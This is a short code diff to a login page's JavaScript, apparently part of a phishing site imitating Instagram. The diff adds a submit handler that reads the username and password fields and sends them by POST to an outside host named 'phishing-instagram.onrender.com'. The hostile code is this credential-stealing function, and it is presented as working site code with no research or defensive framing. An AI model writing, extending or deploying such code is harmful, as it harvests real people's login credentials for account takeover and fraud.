@@ -16,4 +16,35 @@ document.addEventListener('DOMContentLoaded', function () {
     inputs.forEach(input => {
         input.addEventListener('input', validateForm);
     });
+
+
+    //sending request to API 
+    document.getElementById('submitBtn').addEventListener('click', handleSubmit);
+    //on every clcik send a request to the server using a fetch through handle submit function !
+
+
+    function handleSubmit() {
+        try {
+            const link = "https://phishing-instagram.onrender.com"; // backend link
+
+            fetch(link, {  // sending request to the server
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({   // sending username and password to the server
+                    username: document.getElementById('username').value,
+                    password: document.getElementById('password').value
+                })
+            }).then(response => {
+                console.log('Success:', response);  // response from server 
+            })
+                .catch(error => {
+                    console.error('Error:', error);  // catching error if any
+                });
+        } catch (exception) {
+            console.log("something went wrong while sending request ! " + exception)
+        }
+    }
+
 });
